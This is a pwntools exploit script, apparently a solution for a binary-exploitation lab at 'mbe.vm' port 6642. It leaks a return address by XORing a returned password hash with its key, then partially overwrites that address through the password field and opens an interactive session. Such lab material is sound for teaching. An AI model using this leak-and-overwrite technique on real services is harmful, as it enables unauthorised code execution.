from pwn import  *

# f7e ret to main
# af4 login func
# f7e ^ af4 = 58a
p = remote("mbe.vm",6642)

username = "\x02"*32
passwd = " "*32

p.recvuntil("username")
p.sendline(username)

p.recvuntil("password")
p.sendline(passwd)

p.recvuntil("user ")

xor_data = p.recvline()
hashed_pass = xor_data[64:]
key = xor_data[32:64]

leak = bytes(a ^ b for a,b in zip(hashed_pass,key))

print("Return address:",hex(u32(leak[20:24])))

passwd = " "*20+"\xaa\x25" + " "*10
p.recvuntil("username")
p.sendline(username)

p.recvuntil("password")
p.sendline(passwd)

p.recvuntil("user ")

new_data = p.recvline()
new_data = new_data[64:]

print("New return",hex(u32(new_data[20:24])))

p.recvuntil("username")
p.sendline("")

p.recvuntil("password")
p.sendline("")

p.interactive()